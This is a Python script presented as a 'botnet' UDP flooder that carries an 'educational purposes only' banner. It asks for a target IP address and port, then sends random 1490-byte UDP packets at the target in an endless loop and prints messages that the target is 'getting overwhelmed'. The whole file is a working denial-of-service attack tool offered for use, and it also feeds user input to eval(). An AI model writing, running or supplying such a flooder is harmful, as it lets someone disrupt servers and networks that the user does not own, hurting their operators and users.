# Let's import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
from pystyle import *
from datetime import datetime

os.system("clear")

banner = '''
             ═╗ ╦  ╔═╗╦  ╔╗ ╔═╗╔╦╗╔╗╔╔═╗╔╦╗  ═╗ ╦
             ╔╩╦╝  ╠═╝║  ╠╩╗║ ║ ║ ║║║║╣  ║   ╔╩╦╝
             ╩ ╚═  ╩ ╚╝  ╚═╝╚═╝ ╩ ╝╚╝╚═╝ ╩   ╩ ╚═
                                               
       ╔══════════════════════════════════════════════╗
       ║               BOTNET 1.0.0.0                 ║
       ║              coded by PJ0001                 ║
       ║        For Educational Purposes Only         ║
       ╚══════════════════════════════════════════════╝               
'''

print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))

ip = input(f"{Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter('[+] Target IP Address: '))}")
port = eval(input(f"{Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter('[+] Port Number: '))}"))
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))

try:
    socket.inet_aton(ip)  # Validate IP address format
    print(" ✅ Valid IP Address Checked.... ")
    print(" [+] Attack Screen Loading ....")
except socket.error:
    print(" ✘ Invalid IP Address Format")
    exit()

print(" ")
print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))
print(" ")

print(f" [+] DDOSSING is Pulling up to: {ip}")
print(" ")

time.sleep(5)
sent = 0

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data_to_send = random._urandom(1490)

try:
    while True:
        sock.sendto(data_to_send, (ip, port))
        sent = sent + 1
        print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(f"{ip} Is getting overwhelmed by {sent} ")))
        if port == 65534:
            port = 1
except KeyboardInterrupt:
    print(" ")
    print("\n [-] Ctrl+C Detected.........Exiting")
    print(" [-] DDOS ATTACK STOPPED")
    input("Enter To Exit")
    os.system("clear")
    print(" [-] Capy going to sleep")

